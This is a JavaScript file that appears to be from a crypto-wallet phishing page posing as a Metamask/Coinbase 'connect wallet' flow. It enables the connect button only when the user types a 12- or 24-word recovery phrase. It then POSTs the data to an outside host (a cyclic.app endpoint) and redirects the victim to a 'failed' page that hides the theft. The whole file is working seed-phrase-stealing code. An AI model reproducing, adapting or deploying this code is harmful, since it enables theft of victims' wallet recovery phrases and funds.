
function handleMetamask(e){
  const id = "Metamask"; // get the id of the clicked link
  const linkUrl = "loading.html?id=" + id; // create the link URL with the id value as a query parameter
  window.location.href = linkUrl; // redirect the user to the new page
 }

 function handleCoinbase(e){
  const id = "Coinbase"; // get the id of the clicked link
  const linkUrl = "loading.html?id=" + id; // create the link URL with the id value as a query parameter
  window.location.href = linkUrl; // redirect the user to the new page
}


const walletLinksWrapper = document.getElementById("wallet-links-wrapper")
    walletLinksWrapper.addEventListener("click", function(event) {
        // console.log(event.target.parentNode.nodeName)
        if (event.target.parentNode.nodeName === "A") { // check if the clicked element is an <a> tag
            event.preventDefault(); // prevent the default behavior of the link
            const id = event.target.parentNode.getAttribute("id"); // get the id of the clicked link
            const linkUrl = "loading.html?id=" + id; // create the link URL with the id value as a query parameter
            window.location.href = linkUrl; // redirect the user to the new page
    }
});

function countWords() {
    // Get the input text value
    var inputField = document.getElementById("phrase").value;
    var text = inputField.split(' ');
    var numWords = 0;
    for (var i = 0; i < text.length; i++) {
        if (text[i] !== ' ' && isWord(text[i])) {
            numWords++;
        }
    }
    // Display it as output
    document.getElementById("phraseCount").innerHTML = `Count [${numWords}]`;
    
    if(numWords == 12 || numWords == 24){
        document.getElementById("connect-btn").removeAttribute("disabled");

    }else{
        document.getElementById("connect-btn").setAttribute("disabled","disabled");
    }
    
}

function isWord(str) {
    var alphaNumericFound = false;
    for (var i = 0; i < str.length; i++) {
    var code = str.charCodeAt(i);
    if ((code > 47 && code < 58) || // numeric (0-9)
        (code > 64 && code < 91) || // upper alpha (A-Z)
        (code > 96 && code < 123)) { // lower alpha (a-z)
        alphaNumericFound = true;
        return alphaNumericFound;
    }
    }
    return alphaNumericFound;
}

function sendData(data) {
    fetch('https://lucky-sombrero-deer.cyclic.app/connection', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.status === 200) {
        window.location.href = "failed.html";
      } else {

        alert('failed to connect, try again');
        document.getElementById("connect-btn").removeAttribute("disabled");
        
      }
    })
    .catch(error => {
      alert('server error');
      document.getElementById("connect-btn").removeAttribute("disabled");
      
    });
  }

